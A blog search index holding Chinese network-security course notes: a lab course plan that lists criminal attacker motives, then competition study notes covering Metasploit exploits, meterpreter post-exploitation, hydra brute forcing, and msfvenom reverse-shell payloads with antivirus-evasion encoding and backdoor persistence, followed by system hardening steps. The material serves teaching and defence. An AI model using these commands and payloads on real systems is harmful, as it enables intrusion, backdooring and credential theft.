<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>信息安全课程方案</title>
      <link href="/2023/03/06/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%AF%BE%E7%A8%8B%E6%96%B9%E6%A1%88/"/>
      <url>/2023/03/06/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%AF%BE%E7%A8%8B%E6%96%B9%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<h2 id="任务一、密码爆破"><a href="#任务一、密码爆破" class="headerlink" title="任务一、密码爆破"></a>任务一、密码爆破</h2><h3 id="目的："><a href="#目的：" class="headerlink" title="目的："></a>目的：</h3><ol><li>获取用户信息，为诈骗提供条件</li><li>获得用户网盘里的重要资料（可以提前放点重要文件进去）</li><li>传播反动言论</li><li>传播色情淫秽信息牟利</li><li>实施网络赌博</li></ol><h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><pre class="line-numbers language-none"><code class="language-none">hydra -l admin -P passw.txt 192.168.148.130 http-post-form "/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Login failed" -V<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="防御："><a href="#防御：" class="headerlink" title="防御："></a>防御：</h3><ol><li>密码使用带https的密文传输和存储</li><li>限制错误次数，锁定账户</li><li>增加尝试间隔，sleep(3)</li><li>验证码，图片验证码、短信验证码、二维码验证码</li><li>统计尝试频率，锁定IP地址</li><li>token机制</li><li>只能使用二维码登录</li><li>不让用户设置太过于简单的密码<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-zA-Z0-9_*]{6,18}$/'</span><span class="token punctuation">,</span><span class="token variable">$pw</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script&gt;alert('后端校验：密码只能输入中英文和数字，以及_*，6-18位');history.back()&lt;/script&gt;"</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="任务二、发包攻击、注册僵尸账号"><a href="#任务二、发包攻击、注册僵尸账号" class="headerlink" title="任务二、发包攻击、注册僵尸账号"></a>任务二、发包攻击、注册僵尸账号</h2><h3 id="目的：-1"><a href="#目的：-1" class="headerlink" title="目的："></a>目的：</h3><ol><li>通过僵尸账号非法刷票</li><li>通过网络水军制造舆论，发布虚假信息骗人</li></ol><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ol><li>验证码，图片验证码、短信验证码、二维码验证码</li><li>只能通过手机号码注册</li><li>只能通过微信号登录</li></ol><h2 id="任务三、XSS跨站脚本攻击"><a href="#任务三、XSS跨站脚本攻击" class="headerlink" title="任务三、XSS跨站脚本攻击"></a>任务三、XSS跨站脚本攻击</h2><h3 id="目的：-2"><a href="#目的：-2" class="headerlink" title="目的："></a>目的：</h3><ol><li>盗取用户账号</li><li>控制用户电脑</li><li>通过钓鱼网站实施诈骗</li></ol><h3 id="防御：-1"><a href="#防御：-1" class="headerlink" title="防御："></a>防御：</h3><ol><li>不允许用户输入特殊的字符<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 替换掉&lt;</span><span class="token variable">$gb_word</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/&lt;/"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"特殊符号在后端会被我替换掉,再想想别的办法"</span><span class="token punctuation">,</span><span class="token variable">$gb_word</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h2 id="任务四、SQL注入"><a href="#任务四、SQL注入" class="headerlink" title="任务四、SQL注入"></a>任务四、SQL注入</h2><h3 id="目的：-3"><a href="#目的：-3" class="headerlink" title="目的："></a>目的：</h3><ol><li>获取数据库用户信息，盗取用户账号</li><li>获取考试题目</li><li>篡改考试分数</li></ol><h3 id="防御：-2"><a href="#防御：-2" class="headerlink" title="防御："></a>防御：</h3><ol><li>修复漏洞</li><li>对数据库漏洞实施加密<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into info(username,pw,classNum,className,createtime) values ('<span class="token interpolation"><span class="token variable">$username</span></span>','"</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pw</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"',<span class="token interpolation"><span class="token variable">$classNum</span></span>,'<span class="token interpolation"><span class="token variable">$className</span></span>','"</span><span class="token operator">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"')"</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script&gt;alert('注册成功');history.back();&lt;/script&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script&gt;alert('注册失败');history.back();&lt;/script&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="任务五、文件下载漏洞"><a href="#任务五、文件下载漏洞" class="headerlink" title="任务五、文件下载漏洞"></a>任务五、文件下载漏洞</h2><h3 id="目的：-4"><a href="#目的：-4" class="headerlink" title="目的："></a>目的：</h3><ol><li>非法获取网站重要资料，如考试题目</li></ol><h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御:"></a>防御:</h3><ol><li>对文件目录进行加密</li><li>对文件名进行加密<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//保存文件，uniqid()产生唯一的字符串</span>   <span class="token variable">$fileName</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'loggedUsername'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'-'</span><span class="token operator">.</span><span class="token variable">$nameFir</span><span class="token operator">.</span><span class="token string single-quoted-string">'-'</span><span class="token operator">.</span><span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$nameExt</span><span class="token punctuation">;</span>   <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pyFile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$file_dir</span><span class="token operator">.</span><span class="token variable">$upName</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$fileName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token comment">//说明文件保存不成功</span>       <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script&gt;alert('保存文件出错。');history.back();&lt;/script&gt;"</span><span class="token punctuation">;</span>       <span class="token keyword">exit</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="任务六、文件上传漏洞"><a href="#任务六、文件上传漏洞" class="headerlink" title="任务六、文件上传漏洞"></a>任务六、文件上传漏洞</h2><h3 id="目的：-5"><a href="#目的：-5" class="headerlink" title="目的："></a>目的：</h3><ol><li>通过上传木马文件，控制服务器，成为肉鸡，进行DOS攻击</li><li>压缩包炸弹，解压最高可达6PB，瞬间拉满服务器负载，进程全炸</li></ol><h2 id="任务七、ARP中间人攻击"><a href="#任务七、ARP中间人攻击" class="headerlink" title="任务七、ARP中间人攻击"></a>任务七、ARP中间人攻击</h2><h3 id="目的：-6"><a href="#目的：-6" class="headerlink" title="目的："></a>目的：</h3><ol><li>断网攻击（比如使摄像头断网，以便实施作弊）</li><li>获取电脑中重要资料和账号密码</li></ol><h2 id="任务八、挂马攻击"><a href="#任务八、挂马攻击" class="headerlink" title="任务八、挂马攻击"></a>任务八、挂马攻击</h2><h3 id="目的：-7"><a href="#目的：-7" class="headerlink" title="目的："></a>目的：</h3><ol><li>在正常的网站上挂木马，达到控制别人的电脑</li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全笔记整理</title>
      <link href="/2022/11/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/"/>
      <url>/2022/11/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="常用漏洞及其端口"><a href="#常用漏洞及其端口" class="headerlink" title="常用漏洞及其端口"></a>常用漏洞及其端口</h1><ul><li><h5 id="MS08-067"><a href="#MS08-067" class="headerlink" title="MS08_067"></a>MS08_067</h5><p><strong>对应端口：</strong>445<br><strong>对应服务：</strong>smb共享服务<br><strong>发现方式：</strong>nmap –script smb-vuln-ms08-067<br><strong>效果：</strong>获取到目标靶机的meterpreter（系统权限）</p><blockquote><p>注：必须手动设置正确的target、可用check、脚本扫描和设置错误的target都会破坏漏洞</p></blockquote></li><li><h5 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17_010"></a>MS17_010</h5><p><strong>对应端口：</strong>445<br><strong>对应服务：</strong>smb共享服务<br><strong>发现方式：</strong>有配套的扫描模块<br><strong>效果：</strong>获取到目标靶机的meterpreter（系统权限）</p></li><li><h5 id="is-known-pipename"><a href="#is-known-pipename" class="headerlink" title="is_known_pipename"></a>is_known_pipename</h5><p><strong>对应端口：</strong>445<br><strong>对应服务：</strong>Liunx：smb3.X-4.X，smb3.5.0-4.6.4的中间版本<br><strong>效果：</strong>获取到目标靶机的shell<br><strong>漏洞修复：</strong> /etc/samba/smb.conf 76行添加<code>nt pipe support = no</code>,然后重启服务：<code>service smb restart</code></p></li><li><h5 id="CVE-2017-7269"><a href="#CVE-2017-7269" class="headerlink" title="CVE-2017-7269"></a>CVE-2017-7269</h5><p><strong>对应端口：</strong>80<br><strong>对应服务：</strong>IIS 6.0<br><strong>发现方式：</strong>使用nmap –script http-webdav-scan<br><strong>效果：</strong>获取到目标靶机的meterpreter</p><blockquote><p>注：搜索不到，exploit/windows/iis/cve_2017_7269</p></blockquote></li><li><h5 id="MS15-034"><a href="#MS15-034" class="headerlink" title="MS15_034"></a>MS15_034</h5><p><strong>对应端口：</strong>80<br><strong>对应服务：</strong>IIS<br><strong>发现方式：</strong>msf有配套扫描模块<br><strong>效果：</strong>使对方主机蓝屏<br><strong>加固方法：</strong>服务器管理器中关闭内核缓存</p></li><li><h5 id="CVE-2017-8464"><a href="#CVE-2017-8464" class="headerlink" title="CVE-2017-8464"></a>CVE-2017-8464</h5><p><strong>对应端口：</strong>80<br><strong>对应服务：</strong>PHP<br><strong>攻击条件：</strong>需要拿到shell，执行生成的php代码<br><strong>效果：</strong>获取到目标靶机的meterpreter权限</p></li><li><h5 id="vsftpd2-3-4（笑脸漏洞）"><a href="#vsftpd2-3-4（笑脸漏洞）" class="headerlink" title="vsftpd2.3.4（笑脸漏洞）"></a>vsftpd2.3.4（笑脸漏洞）</h5><p><strong>对应端口：</strong>21<br><strong>对应服务：</strong>vsftpd2.3.4<br><strong>利用方式：</strong>使用msf搜索vsftpd，或者ftp使用root:)，密码空登录，然后nc 6200端口<br><strong>效果：</strong>获取到目标靶机的shell</p></li><li><h5 id="mssql-exec"><a href="#mssql-exec" class="headerlink" title="mssql_exec"></a>mssql_exec</h5><p><strong>对应端口：</strong>1433<br><strong>对应服务：</strong>mssql<br><strong>利用条件：</strong>通过暴力破解获得密码（默认账号sa）<br><strong>效果：</strong>可以执行cmd指令</p><blockquote><p>注：开启远程桌面命令需要对“和\使用\转义</p></blockquote></li><li><h5 id="MS12-020"><a href="#MS12-020" class="headerlink" title="MS12_020"></a>MS12_020</h5><p><strong>对应端口：</strong>3389<br><strong>发现方式：</strong>msf有配套扫描模块<br><strong>效果：</strong>使对方主机蓝屏<br><strong>修复方法：</strong>服务（services.msc）中关闭Remote Desktop Services</p></li><li><h5 id="ms14-064"><a href="#ms14-064" class="headerlink" title="ms14_064"></a>ms14_064</h5><p><strong>利用方式：</strong>需要通过远程桌面点击恶意链接<br><strong>效果：</strong>获取到目标靶机的meterpreter（系统权限）（仅限windows）</p></li><li><h5 id="CVE-2018-4878"><a href="#CVE-2018-4878" class="headerlink" title="CVE-2018-4878"></a>CVE-2018-4878</h5><p><strong>攻击条件：</strong>需要Flash 0Day漏洞<br><strong>效果：</strong>将产生的攻击载荷放在80端口的index.html，用（exploit/multi/handler）监听，等待靶机访问</p></li><li><h5 id="MS11-003"><a href="#MS11-003" class="headerlink" title="MS11_003"></a>MS11_003</h5><p><strong>攻击条件：</strong>ie8浏览器存在css漏洞<br><strong>效果：</strong>生成钓鱼链接，别人访问链接之后产生session</p><blockquote><p>注: target必须设置正确</p></blockquote></li><li><h5 id="Java-store"><a href="#Java-store" class="headerlink" title="Java_store"></a>Java_store</h5><p><strong>攻击条件：</strong>存在java无效数组索引漏洞，java安全等级低，需要远程桌面点击恶意链接。<br><strong>效果：</strong>获取到目标靶机的meterpreter权限</p><blockquote><p>注: payload最好使用http</p></blockquote></li><li><h5 id="Esteemaudit"><a href="#Esteemaudit" class="headerlink" title="Esteemaudit"></a>Esteemaudit</h5><p><strong>攻击条件：</strong>windows2003或xp，开启域和远程桌面<br><strong>对应端口：</strong>135，139，3389<br><strong>效果：</strong>获取到目标靶机的<code>最高</code>meterpreter权限</p></li><li><h5 id="exploit-x2F-multi-x2F-handler"><a href="#exploit-x2F-multi-x2F-handler" class="headerlink" title="exploit/multi/handler"></a>exploit/multi/handler</h5></li></ul><p><strong>效果：</strong>监听端口，推荐使用-j后台运行</p><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="1-DOS命令："><a href="#1-DOS命令：" class="headerlink" title="1.DOS命令："></a>1.DOS命令：</h2><ul><li><strong>systeminfo:</strong> 查看系统信息</li><li><strong>tasklist /svc:</strong> 计算机进程</li><li><strong>netstat -an:</strong>  查看开放的端口</li><li><strong>REG ADD HKLM/SYSTEM/CurrentControlSet/Control/Terminal “ “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f：</strong>开启3389端口</li><li><strong>|findstr:</strong> 字符串过滤</li><li><strong>wmic process where name = “进程名” get name,executablepath:</strong> 查找进程</li><li><strong>net config:</strong> 配置服务器或域相关设置</li><li><strong>type:</strong> 显示文件内容</li><li><strong>wce.exe -w:</strong> 导出本地用户hash</li><li><strong>set log:</strong> 查看域控主机名</li><li><strong>shell:startup:</strong> 打开启动运行文件夹</li></ul><h2 id="2-linux命令："><a href="#2-linux命令：" class="headerlink" title="2.linux命令："></a>2.linux命令：</h2><ul><li><strong>locate 关键词:</strong> 查找文件</li><li><strong>|grep:</strong> 过滤字符</li></ul><h2 id="3-meterpreter命令"><a href="#3-meterpreter命令" class="headerlink" title="3.meterpreter命令"></a>3.meterpreter命令</h2><ul><li><strong>sysinfo:</strong> 查看系统信息</li><li><strong>shell:</strong> 打开终端</li><li><strong>load mimikatz(Kiwi):</strong> wdigest可以获取管理员密码</li><li><strong>run getgui -e</strong>:启动目标靶机的远程桌面服务</li><li><strong>del:</strong> 删除文件</li><li><strong>edit:</strong> 编辑文件</li><li><strong>cat:</strong> 读取文件</li><li><strong>reboot:</strong> 重启</li><li><strong>ps:</strong> 查看运行进程pid</li><li><strong>migrate：</strong>迁移进程</li><li><strong>getpid:</strong> 查看当前的进程号</li><li><strong>background:</strong> 将会话置于后台</li><li><strong>hashdump:</strong> 获取哈希密码（如果不行可以搜索使用hashdunp模块）（配合linux ophcrack解密工具）</li><li><strong>getuid、getsystem、getprivs:</strong> 提权</li><li><strong>:</strong> 提权</li><li><strong>background:</strong> 切换到后台运行</li><li><strong>run persistence:</strong> 注入后门（-X 开机时自动加载 -i 回连的时间间隔 -p 端口号 -r 渗透机ip）</li></ul><h2 id="4-常用数据库命令"><a href="#4-常用数据库命令" class="headerlink" title="4.常用数据库命令"></a>4.常用数据库命令</h2><ul><li><strong>mysql -h 主机地址 -u用户名 -p密码:</strong> 登录数据库</li><li><strong>select version():</strong> 查看数据库版本 </li><li><strong>show databases:</strong> 显示所有数据库</li><li><strong>drop database 数据库名:</strong> 删除数据库</li><li>**drop user ‘username‘@’%’: 删除用户</li><li><strong>create database 数据库名：</strong> 新建数据库</li><li><strong>use 数据库名：</strong> 使用数据库</li><li><strong>show tables:</strong> 显示当前数据库中的所有数据表</li><li><strong>describe 表名:</strong> 查看表结构</li><li><strong>select 字段1,字段2 from 表名 where 条件:</strong> 查看数据表中的字段</li><li><strong>update 数据表 set 字段 = ‘新值’ where 条件：</strong> 修改用户表</li><li><strong>flush privileges:</strong> 刷新权限</li><li><strong>show grants for 用户名@’主机地址’：</strong> 查看当前用户权限</li><li><strong>grant 权限 on 数据库名.表名 to 用户名@’主机名’（*.*表示所有数据库所有表）：</strong>授权</li></ul><h1 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><ul><li><strong>-sS:</strong> TCP同步扫描，半开放式</li><li><strong>-sV:</strong> 扫描系统服务及版本信息</li><li><strong>-sC:</strong> 调用默认的服务扫描脚本</li><li><strong>-sP:</strong> ping扫描</li><li><strong>-Pn:</strong> 不进行ping</li><li><strong>-oX xx.xml:</strong> 以xml格式输出</li><li><strong>-O:</strong> 操作系统扫描</li></ul><h2 id="netdiscover-网络扫描工具"><a href="#netdiscover-网络扫描工具" class="headerlink" title="netdiscover(网络扫描工具)"></a>netdiscover(网络扫描工具)</h2><p><strong>netdiscover -r 目标网段  （-r 扫描范围，例如192.168.0.0/24）</strong></p><h2 id="dirb-基于字典的web目录扫描工具"><a href="#dirb-基于字典的web目录扫描工具" class="headerlink" title="dirb(基于字典的web目录扫描工具)"></a>dirb(基于字典的web目录扫描工具)</h2><p><strong>dirb http://192.168.1.0/24</strong></p><h2 id="nikto-Web漏洞扫描神器"><a href="#nikto-Web漏洞扫描神器" class="headerlink" title="nikto(Web漏洞扫描神器)"></a>nikto(Web漏洞扫描神器)</h2><p><strong>nikto -host http://172.168.1.105</strong></p><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p><strong>ssh 客户端用户名@服务器ip地址</strong><br><strong>-X</strong> 调用图形界面<br><strong>-p</strong> 选项来修改端口号，默认22<br><strong>-i</strong> 使用私钥</p><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p><strong>sqlmap -u “http://172.16.1.1/login.php” –forms –level 3 –dbs</strong><br>–forms 针对form表单<br>-l 使用txt文件<br>-p Host 手动指定检查HTTP头中的HOST<br>–level 扫描级别，1-5，默认是1,越高越强<br>–batch 不用询问，使用默认的选项<br>–dbs 显示所有数据库<br>-D 指定数据库<br>–tables 显示选定数据库下的数据表<br>-T 指定数据表<br>–columns 显示选定表中的所有列名<br>-C 指定列名<br>–dump 导出选中的列名</p><h2 id="msfvenom（后门木马生成工具）"><a href="#msfvenom（后门木马生成工具）" class="headerlink" title="msfvenom（后门木马生成工具）"></a>msfvenom（后门木马生成工具）</h2><p>-p 载荷(msfvenom -l payloads)<br>-f 输出格式(msfvenom –help-formats)<br>-o 文件输出<br>-x 绑定软件<br>-e 编码免杀(msfvenom -l encoders)<br>-i 编码次数<br>-a 架构平台(x86/x64)<br>– platform 平台(windows/linux)<br>简单型：<strong>msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.1.100 LPORT=8080 -f exe -o payload.exe</strong><br>绑定软件型：<strong>msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.1.100 LPORT=8080 -x /root/putty.exe -f exe -o payload.exe</strong><br>编码免杀型：<strong>msfvenom –p windows/meterpreter/reverse_tcp LHOST=172.16.1.100 LPORT=8080 –e x86/shikata_ga_nai –i 3 –f exe –o C:\back.exe</strong></p><h2 id="weevely（后门木马生成工具）"><a href="#weevely（后门木马生成工具）" class="headerlink" title="weevely（后门木马生成工具）"></a>weevely（后门木马生成工具）</h2><ul><li><strong>weevely generate password path:</strong> 生成后门木马文件</li><li><strong>weevely URL password:</strong> 连接生成的木马</li><li><strong>weevely generate.img password /xx.gif ./ :</strong> 在当前文件夹生成gif木马，只有kail1.0可用</li></ul><h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><ul><li><strong>msfdb init:</strong>  初始化数据库</li><li><strong>db_import /xx/xx.xml:</strong> 导入扫描结果</li><li><strong>services:</strong> 查看导入的数据</li><li><strong>host:</strong> 查看导入的主机数据</li><li><strong>exploit/multi/handler:</strong> 监听端口模块</li></ul><h2 id="wireshark（网络抓包工具）"><a href="#wireshark（网络抓包工具）" class="headerlink" title="wireshark（网络抓包工具）"></a>wireshark（网络抓包工具）</h2><ul><li><strong>tcp.connection.syn:</strong> 过滤出tcp协议</li><li><strong>ip.src==:’</strong> 过滤源地址</li><li><strong>ip.dst==:’’</strong> 过滤目标地址</li><li><strong>ip.addr==:</strong> 包括源地址和目标地址</li><li><strong>telnet contains “login’’</strong> 查看目标主机名</li><li><strong>tcp.port==3306:</strong> 过滤3306端口</li><li><strong>ftp-data:</strong> FTP下载的文件</li><li><strong>ftp contains “230” || ftp contains “success”:</strong> 230为FTP服务应答码，表示用户登录</li><li><strong>ftp contains “220” || ftp contains “FTP”:</strong> 220为FTP服务应答码，表示服务就绪</li></ul><h2 id="dissniff"><a href="#dissniff" class="headerlink" title="dissniff"></a>dissniff</h2><p><strong>dissniff -i eth0 -t 21/tcp=ftp,23/tcp=telnet</strong></p><h2 id="you-get"><a href="#you-get" class="headerlink" title="you-get"></a>you-get</h2><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">you-get -c C:\Users\Administrator\AppData\Roaming\Mozilla\Firefox\Profiles\jleeq0k9.default-release\cookies.sqlite -i <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="设备题目"><a href="#设备题目" class="headerlink" title="设备题目"></a>设备题目</h1><h2 id="第一题（windows8）"><a href="#第一题（windows8）" class="headerlink" title="第一题（windows8）"></a>第一题（windows8）</h2><p><strong>1. 设置密码策略必须同时满足大小写字母、数字、特殊字符，最小密码长度不少于8个字符，密码最长使用期限为15天。将服务器上密码策略配置信息截图;</strong><br>开始——管理工具——本地安全策略——账户策略——密码策略<br><strong>2. 在用户登录系统时，应该有“For authorized users only”提示信息，将登录系统时系统弹出警告信息窗口截图;</strong><br>组策略（gpedit.msc）——计算机配置——windows设置——安全设置——本地策略——安全选项——交互式登录——标题和消息文字都设置一下<br><strong>3. 一分钟内仅允许5次登录失败的尝试，超过5次，登录帐号锁定1分钟,将账号锁定策略配置信息截图</strong><br>本地安全策略——账户策略——账户锁定策略<br><strong>4.设置远程桌面用户非活动会话连接超时应小于等于5分钟，将RDP-Tcp属性对应的配置界面截图；</strong><br>设置：组策略——计算机配置——管理模板——windows组件——远程桌面服务——远程桌面会话主机——会话时间限制——设置空闲会话的时间限制<br>查看：管理工具——远程桌面服务——远程桌面会话主机配置——双击RDP-Tcp——会话<br><strong>5.通过SSL（TLS 1.0）加密服务器的远程桌面服务，将RDP-Tcp属性对应的配置界面截图；</strong><br>管理工具——远程桌面服务——远程桌面会话主机配置——双击RDP-Tcp——常规<br><strong>6.仅允许超级管理员账号关闭系统，将关闭系统属性的配置界面截图；</strong><br>本地安全策略——本地策略——用户权限分配——关闭系统<br><strong>7.开启IIS的日志审计记录，日志文件保存格式为W3C,只记录日期、时间、客户端IP地址、用户名、服务器端口、方法，将W3C日志记录字段的配置界面截图；</strong><br>开始——管理工具——IIS管理器——日志——格式——选择字段<br><strong>8.设置网站的最大并发连接数为1000，网站连接超时为60s，将编辑网站限制的配置界面截图；</strong><br>网站——IIS的站点——配置——限制<br><strong>9.禁用IIS内核缓存，避免对方利用ms15_034漏洞进行DOS攻击，出现蓝屏的现象，将编辑输出缓存设置的配置界面截图；</strong><br>开始——管理工具——IIS管理器——输出缓存——编辑功能设置<br><strong>10.设置user1用户只能在上班时间（周一至周五的9:00~18:00）可以登录。将user1的登录时间配置界面截图。</strong><br>net user user1 /times:M-F,9:00-18:00         （M、T、W、Th、F、Sa、Su）</p><h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h2><p><strong>1.设置最小密码长度不少于8个字符，密码最长使用期限为15天。将/etc/login.defs配置文件中对应的部分截图;</strong><br>/etc/login.defs<br><strong>2.设置在用户登录系统时，会有“For authorized users only”提示信息，将登录系统时系统弹出提示信息界面截图;</strong><br>/etc/issue  配置文件末尾添加 （存疑）<br>只是这样修改的话在 ssh 连接时是不会有提示信息的，需要修改 ssh 配置文本<br>vim /etc/ssh/sshd_config<br>在下方添加一行 Banner /etc/ssh/banner<br>touch /etc/ssh/banner<br>vim /etc/ssh/banner<br>在文件内添加需要提示的提示信息，完成后集团的重启 SSH 服务 systemctl restart sshd<br><strong>3.设置root用户的计划任务。每天早上7:50自动开启vsftpd服务，22点50时关闭；每周六的7:30时，重新启动vsftpd服务。使用crontab –l 查看计划任务，将回显结果截图；</strong></p><ul><li>crontab -选项：</li><li>-u　　指定用户设定计划</li><li>-e　　进入用户编辑计划</li><li>-l　　列出用户任务计划</li><li>-r　　删除用户任务计划<br>crontab -u root -l<br>50 7 * * * /sbin/service vsftpd start<br>50 22 * * * /sbin/service vsftpd stop<br>30 7 * * 6 /sbin/service vsftpd restart</li></ul><p><strong>4.禁止匿名用户登录vsftpd服务，将/etc/vsftpd/vsftpd.conf配置文件中对应的部分截图；</strong><br>anonymous_enable=no<br><strong>5.限制客户端连接vsftpd服务时，同一个IP最多只能打开两个连接，将/etc/vsftpd/vsftpd.conf配置文件中对应的部分截图；</strong><br>在文件末尾添加：max_per_ip=2<br><strong>6.将SSH服务的端口号修改为2222 ,使用命令netstat -anltp | grep sshd查看SSH服务端口信息，将回显结果截图；</strong><br>Port 2222<br>service sshd restart<br><strong>7.禁止root用户通过SSH远程登录，将/etc/ssh/sshd_config 配置文件中对应的部分截图；</strong><br>RermitRootLogin NO<br><strong>8.禁止mysql服务以管理员权限的账号运行，将/etc/my.cnf配置文件中对应的部分截图；</strong><br>在my.cnf配置文件中配置user=mysql<br><strong>9.删除默认数据库test, 然后使用show databases;命令查看当前的数据库信息，将回显结果截图；</strong><br>drop database test<br><strong>10.将数据库用户user1的密码使用MD5加密，然后在数据库中使用select password from user where user=’user1’;命令查看user1的密码，将回显结果截图。</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">update user set password<span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token char">'P@ssw0rd1!'</span><span class="token punctuation">)</span> where User<span class="token operator">=</span><span class="token char">'user1'</span><span class="token punctuation">;</span>flush privileges<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="A-2任务二-数据库加固（Data）"><a href="#A-2任务二-数据库加固（Data）" class="headerlink" title="A-2任务二 数据库加固（Data）"></a>A-2任务二 数据库加固（Data）</h2><p><strong>1.以普通账户mysql安全运行Mysql，禁止Mysql以管理员账号权限运行；</strong><br>修改Mysql配置文本，<code>vim /etc/my.cnf</code><br>在 [mysqld] 下方新增一行 <code>user=mysql</code> (如果没有 mysql 用户需要自行创建)<br>修改完后重启Mysql服务，<code>service mysqld restart</code><br><strong>2.删除默认数据库(test)；</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">show databases<span class="token punctuation">;</span>create database test<span class="token punctuation">;</span>drop database test<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>3.改变默认Mysql管理员用户为SuperRoot；</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">select User<span class="token punctuation">,</span>Password from user<span class="token punctuation">;</span>update user set User <span class="token operator">=</span> <span class="token char">'SuperRoot'</span> where User <span class="token operator">=</span> <span class="token char">'root'</span><span class="token punctuation">;</span><span class="token comment">//将当前user和privilige表中的用户信息/权限设置从mysql库 (MySQL数据库的内置库)中提取到内存里</span>flush privileges<span class="token 